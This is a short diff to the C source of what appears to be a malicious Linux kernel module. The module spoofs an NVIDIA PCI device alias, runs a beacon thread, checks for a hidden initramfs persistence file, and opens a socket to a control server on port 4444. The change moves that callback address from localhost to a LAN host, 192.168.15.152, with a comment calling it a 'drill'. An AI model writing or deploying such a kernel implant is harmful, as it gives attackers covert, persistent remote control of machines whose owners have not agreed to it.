@@ -24,9 +24,20 @@ MODULE_ALIAS("pci:v000010DEd00001D01sv*sd*bc*sc*i*");
 
 static struct task_struct *beacon_thread;
 static struct socket *conn_socket = NULL;
-#define SERVER_IP   0x7F000001  // 127.0.0.1
+static const char *server_ip_str = "192.168.15.152"; // drill
 #define SERVER_PORT 4444
 #define BUF_SIZE 1024
+
+static __be32 resolve_ip(const char *ip_str) {
+    __be32 addr = 0;
+    u8 ip[4];
+
+    if (in4_pton(ip_str, -1, ip, '\0', NULL)) {
+        addr = *((__be32 *)ip);
+    }
+
+    return addr;
+}
 
 // Check if persistence exists by testing for the hidden initramfs file
 static bool is_persisted(void) {
@@ -86,7 +97,7 @@ static int connect_to_server(void) {
 
     memset(&s_addr, 0, sizeof(s_addr));
     s_addr.sin_family = AF_INET;
-    s_addr.sin_addr.s_addr = htonl(SERVER_IP);
+    s_addr.sin_addr.s_addr = resolve_ip(server_ip_str);
     s_addr.sin_port = htons(SERVER_PORT);
 
     ret = conn_socket->ops->connect(conn_socket, (struct sockaddr *)&s_addr, sizeof(s_addr), 0);
